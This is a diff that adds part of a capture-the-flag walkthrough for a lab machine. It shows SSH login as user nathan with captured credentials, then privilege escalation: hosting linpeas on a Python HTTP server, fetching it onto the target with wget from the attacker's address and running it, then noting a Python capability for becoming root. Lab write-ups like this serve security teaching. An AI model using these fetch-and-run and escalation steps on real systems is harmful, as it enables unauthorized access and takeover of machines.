@@ -44,3 +44,42 @@ Here we see requests in which the user _**Nathan**_ logs in and is successful, w
 
 
 We've found out the most important thing, so now we can move on to logging in and searching for the flag.
+
+Now we log in with this data, I will use SSH because it is more convenient, but you can also use FTP.
+
+```
+ssh nathan@10.10.10.245
+```
+
+![image](https://github.com/user-attachments/assets/dd52c114-7a7b-49d7-82a7-d14918ec18ce)
+
+And here is our user flag.
+
+## Privilege Escalation
+
+![image](https://github.com/user-attachments/assets/98284242-7e7e-4e65-9392-9d934aca2e50)
+
+As we can see, our **Nathan** does not have the ability to use `sudo`, so we use `linpeas`.
+
+Launching our server on Python:
+
+```
+sudo python3 -m http.server 9999
+```
+and with `wget` getting `linpeas`:
+
+```
+wget http://10.10.14.139:9999/linpeas.sh
+```
+
+![image](https://github.com/user-attachments/assets/4ec087bf-b0e1-48c1-a4e7-091e7055277c)
+
+Launching linpeas:
+
+```
+nathan@10.10.10.245:~$ ./linpeas.sh
+```
+![image](https://github.com/user-attachments/assets/8367a5e4-c23a-4b19-9ccd-709f2034566d)
+
+And that's the vulnerability, which means that with Python's help we can change Nathan's ID to Root's ID.
+
